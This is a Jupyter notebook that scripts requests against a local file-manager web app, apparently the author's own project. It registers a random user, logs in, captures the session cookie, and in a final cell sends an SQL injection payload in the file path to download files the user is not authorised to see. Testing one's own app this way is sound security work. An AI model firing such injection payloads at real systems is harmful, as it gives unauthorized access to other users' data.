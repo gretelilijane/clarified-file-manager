{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Server host: 0.0.0.0, port: 8070\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from requests_toolbelt import MultipartEncoder\n",
    "from requests_toolbelt.utils import dump\n",
    "import os\n",
    "import random\n",
    "import string\n",
    "import urllib.parse\n",
    "\n",
    "def get_random_string(length):\n",
    "    # choose from all lowercase letter\n",
    "    letters = string.ascii_lowercase\n",
    "    return''.join(random.choice(letters) for i in range(length))\n",
    "\n",
    "def get_url(endpoint: string):\n",
    "    return f\"http://{host}:{port}/{endpoint}\"\n",
    "\n",
    "# Read in server host and port from environment variables\n",
    "host = os.getenv('SERVER_HOST', 'localhost')\n",
    "port = os.getenv('SERVER_PORT', '8070')\n",
    "\n",
    "print(f\"Server host: {host}, port: {port}\")\n",
    "\n",
    "session = requests.Session()\n",
    "\n",
    "class User:\n",
    "    def __init__(self, username, password):\n",
    "        self.username = username\n",
    "        self.password = password\n",
    "\n",
    "    session_cookie: string = None\n",
    "    prev_session_cookie: string = None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Username: kzrasxysmh, password: hqjmanhqwo\n",
      "< POST /signup HTTP/1.1\n",
      "< Host: 0.0.0.0:8070\n",
      "< Content-Type: multipart/form-data; boundary=009c45354d114e17ac8d7656c72b8143\n",
      "< Content-Length: 343\n",
      "< \n",
      "<< Request body is not a string-like type >>\n",
      "\n",
      "> HTTP/1.1 200 OK\n",
      "> Date: Sun, 15 Dec 2024 21:36:47 GMT\n",
      "> Content-Type: text/html; charset=utf-8\n",
      "> Transfer-Encoding: chunked\n",
      "> \n",
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<head>\n",
      "    <meta charset=\"UTF-8\">\n",
      "    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n",
      "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
      "    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\" rel=\"stylesheet\">\n",
      "    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css\" integrity=\"sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" />\n",
      "    <script src=\"https://unpkg.com/htmx.org@1.9.12\"></script>\n",
      "    <link rel=\"stylesheet\" href=\"/static/css/styles.css\" />\n",
      "    <title>Clarified-file-manager</title>\n",
      "</head>\n",
      "<body>\n",
      "    <nav class=\"navbar navbar-dark bg-dark\">\n",
      "        <div class=\"container-fluid\">\n",
      "            <a class=\"navbar-brand\">Clarified-file-manager</a>\n",
      "            \n",
      "<ul class=\"navbar-nav mb-1 mb-lg-0 d-flex\">\n",
      "    <li class=\"nav-item\">\n",
      "      <a class=\"nav-link active\" aria-current=\"page\" href=\"/login\">Log in</a>\n",
      "    </li>\n",
      "</ul>\n",
      "\n",
      "        </div>\n",
      "      </nav>\n",
      "    <div class=\"row\">\n",
      "        <div class=\"p-5 mt-5\">\n",
      "            \n",
      "<form hx-post=\"/signup\" hx-target=\"#messages\" hx-encoding=\"multipart/form-data\">\n",
      "  <div class=\"form-group\">\n",
      "    <label for=\"username\" class=\"form-label\">Username</label>\n",
      "    <input type=\"text\" class=\"form-control\" id=\"username\" name=\"username\" required>\n",
      "  </div>\n",
      "  <div class=\"form-group\">\n",
      "    <label for=\"password\" class=\"form-label\">Password</label>\n",
      "    <input type=\"password\" class=\"form-control\" id=\"password\" name=\"password\" required>\n",
      "  </div>\n",
      "  <div class=\"form-group\">\n",
      "    <label for=\"confirm_password\" class=\"form-label\">Confirm Password</label>\n",
      "    <input type=\"password\" class=\"form-control\" id=\"confirm_password\" name=\"confirm_password\" required>\n",
      "  </div>\n",
      "  <button type=\"submit\" class=\"btn btn-primary mt-2\">Sign up</button>\n",
      "</form>\n",
      "\n",
      "<div id=\"messages\">\n",
      "\n",
      "\n",
      "\n",
      "<div class=\"alert alert-success mt-3\" role=\"alert\">\n",
      "  You can now <a href=\"/login\" hx-target=\"body\">log in</a>.\n",
      "</div>\n",
      "\n",
      "</div>\n",
      "\n",
      "        </div>\n",
      "    </div>\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "# SIGNUP\n",
    "# Create random username and password\n",
    "username = get_random_string(10)\n",
    "password = get_random_string(10)\n",
    "\n",
    "user = User(username, password)\n",
    "\n",
    "print(f\"Username: {username}, password: {password}\")\n",
    "\n",
    "# Register user\n",
    "m = MultipartEncoder(fields={\n",
    "    'username': user.username,\n",
    "    'password': user.password,\n",
    "    'confirm_password': user.password,\n",
    "})\n",
    "\n",
    "try: \n",
    "    req = requests.Request('POST', get_url('signup'), data=m, headers={'Content-Type': m.content_type})\n",
    "    prepared = req.prepare()\n",
    "    response = session.send(prepared)\n",
    "except requests.exceptions.RequestException as e:\n",
    "    print(f\"Error: {e}\")\n",
    "    exit(1)\n",
    "\n",
    "signup_req_data = dump.dump_all(response)\n",
    "print(signup_req_data.decode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Session: MTczNDI5ODYwN3xEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBRGc9fJ83hXkz1MfZhHMNEl00XCntcg7aO6ZHKt0UgJ4dQHQg\n"
     ]
    }
   ],
   "source": [
    "# LOGIN\n",
    "# Register user\n",
    "m = MultipartEncoder(fields={\n",
    "    'username': user.username,\n",
    "    'password': user.password\n",
    "})\n",
    "\n",
    "try: \n",
    "    req = requests.Request('POST', get_url('login'), data=m, headers={'Content-Type': m.content_type})\n",
    "    prepared = req.prepare()\n",
    "    response = session.send(prepared)\n",
    "except requests.exceptions.RequestException as e:\n",
    "    print(f\"Error: {e}\")\n",
    "    exit(1)\n",
    "\n",
    "login_req_data = dump.dump_all(response)\n",
    "# print(login_req_data.decode('utf-8'))\n",
    "\n",
    "user.session_cookie = response.cookies['session']\n",
    "print(f\"Session: {user.session_cookie}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# SQL INJECTION\n",
    "try:\n",
    "\n",
    "    # Download unauthorized files\n",
    "    query = \"files/1 OR '1'='1' ORDER BY name LIMIT 1 OFFSET 1;--\"\n",
    "\n",
    "    #query = 'files?sort='\n",
    "    req = requests.Request('GET', get_url(query), cookies={'session': user.session_cookie})\n",
    "    prepared = req.prepare()\n",
    "    response = session.send(prepared)\n",
    "except requests.exceptions.RequestException as e:\n",
    "    print(f\"Error: {e}\")\n",
    "    exit(1)\n",
    "\n",
    "response\n",
    "# files_req_data = dump.dump_all(response)\n",
    "# print(files_req_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0rc1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
